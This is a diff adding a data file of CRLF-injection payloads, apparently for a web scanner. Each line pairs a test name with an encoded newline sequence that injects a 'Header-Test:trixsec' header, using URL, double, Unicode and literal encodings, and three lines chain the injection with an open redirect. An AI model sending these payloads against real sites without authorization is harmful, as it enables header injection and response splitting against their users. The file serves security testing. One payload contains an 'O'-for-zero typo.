@@ -1,0 +1,29 @@
+CRLF Injection with %0A::%0AHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %0A%20::%0A%20Header-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %20%0A::%20%0AHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %23%0A::%23%OAHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %E5%98%8A%E5%98%8D::%E5%98%8A%E5%98%8DHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %E5%98%8A%E5%98%8D%0A::%E5%98%8A%E5%98%8D%0AHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %3F%0A::%3F%0AHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %0D::%0DHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %0D%20::%0D%20Header-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %20%0D::%20%0DHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %23%0D::%23%0DHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %0D%0A::%0D%0AHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %0D%0A%20::%0D%0A%20Header-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %20%0D%0A::%20%0D%0AHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %23%0D%0A::%23%0D%0AHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with \\r\\n::\\r\\nHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with suffix space \\r\\n:: \\r\\n Header-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %5cr%5cn::%5cr%5cnHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %E5%98%8A%E5%98%8D%0D%0A::%E5%98%8A%E5%98%8D%0D%0AHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %0D%0A%09::%0D%0A%09Header-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %250A::%250AHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %25250A::%25250AHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %%0A0A::%%0A0AHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %25%30A::%25%30AHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %25%30%61::%25%30%61Header-Test:trixsec::Header-Test:trixsec
+CRLF Injection with %u000A::%u000AHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with open redirect chain %2F%2E%2E%0D%0A:://www.google.com/%2F%2E%2E%0D%0AHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with open redirect chain %2E%2E%2F%0D%0A::/www.google.com/%2E%2E%2F%0D%0AHeader-Test:trixsec::Header-Test:trixsec
+CRLF Injection with open redirect chain %2F..%0D%0A::/google.com/%2F..%0D%0AHeader-Test:trixsec::Header-Test:trixsec
